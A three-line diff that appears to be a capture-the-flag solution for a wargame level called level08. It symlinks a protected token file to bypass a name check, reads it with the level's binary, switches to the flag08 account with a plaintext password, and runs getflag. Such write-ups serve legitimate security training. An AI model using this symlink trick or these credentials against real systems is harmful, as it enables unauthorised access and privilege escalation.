@@ -1,0 +1,3 @@
+ ln -s /home/user/level08/token /tmp/my_tok && ./level08 /tmp/my_tok
+ su flag08 quif5eloekouj29ke0vouxean
+ getflag
